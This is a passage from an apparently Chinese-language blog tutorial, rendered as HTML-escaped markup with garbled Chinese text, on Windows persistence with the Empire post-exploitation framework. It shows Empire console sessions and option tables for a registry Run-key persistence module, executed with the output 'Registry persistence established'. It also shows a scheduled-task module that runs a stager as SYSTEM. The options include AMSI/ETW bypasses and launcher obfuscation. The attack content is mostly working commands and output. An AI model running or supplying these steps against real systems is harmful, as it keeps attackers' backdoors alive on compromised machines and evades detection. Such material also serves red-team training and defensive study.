&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value                               â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ADSPath          â”‚                                     â”‚ False    â”‚ Alternate-data-stream location to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ store the script code.              â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ KV9PG5FS                            â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw                  â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Cleanup          â”‚                                     â”‚ False    â”‚ Switch. Cleanup the trigger and any â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ script from specified location.     â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ EventLogID       â”‚                                     â”‚ False    â”‚ Store the script in the Application â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ event log under the specified       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ EventID. The ID needs to be         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ unique/rare!                        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ExtFile          â”‚                                     â”‚ False    â”‚ Use an external file &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ payload instead of a stager.        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ KeyName          â”‚ Updater                             â”‚ True     â”‚ Key name &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the run trigger.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚ &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;                                â”‚ False    â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False                               â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;                         â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default                             â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default                             â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ RegPath          â”‚ HKCU:Software&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;ur â”‚ False    â”‚ Registry location to store the      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚ rentVersion&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;un                     â”‚          â”‚ script code. Last element is the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ key name.                           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default                             â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/persistence/userland/registry&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; RegPath &lt;span class=&#34;s2&#34;&gt;&amp;#34;HKCU:Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/persistence/userland/registry&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked KV9PG5FS to run Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Registry persistence established using listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; stored in HKCU:Software&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentVersion&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;un.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“ç„¶ï¼Œä¸Šæ˜¯è®¾ç½®åœ¨å½“å‰ç”¨æˆ·çš„æ³¨å†Œè¡¨ï¼Œæƒ³è¦æœ¬åœ°æ‰€ä»¥ç™»å½•çš„ç”¨æˆ·éƒ½èµ·æ•ˆé‚£å°±è®¾ç½®ä¸‹é¢çš„è·¯å¾„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œå®Œä¹‹åï¼Œæˆ‘ä»¬æ³¨é”€ç”¨æˆ·ï¼Œé‡æ–°ç™»å½•çš„æ—¶å€™å°±ä¼šåœ¨empireä¸Šçº¿äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;è®¡åˆ’ä»»åŠ¡&#34;&gt;è®¡åˆ’ä»»åŠ¡&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªå¯ä»¥å¾—åˆ°systemæƒé™ï¼Œè¿˜æœ‰å¦å¤–ä¸€ä¸ªæ¨¡å—æ˜¯åˆ©ç”¨è®¡åˆ’ä»»åŠ¡ä¸Šçº¿çš„ï¼Œè·Ÿæ³¨å†Œè¡¨å·®ä¸å¤šï¼Œä¸‹é¢è¿™ä¸ªæ¨¡å—æ˜¯è¦åœ¨ç®¡ç†å‘˜æƒé™ä¸‹æ‰§è¡Œçš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; interact 45WYG2ZB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 45WYG2ZB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 45WYG2ZB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/persistence/elevated/schtasks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to 45WYG2ZB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @mattifestation                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @harmj0y                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/mattifestation/PowerSploit/blob/master/Persistence/ 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              Persistence.psm1                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Persist a stager &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;or script&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; using schtasks running as SYSTEM. This    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              has a moderate detection/removal rating.                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/persistence/elevated/schtasks                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Software     http://attack.mitre.org/software/S0111                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1053                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
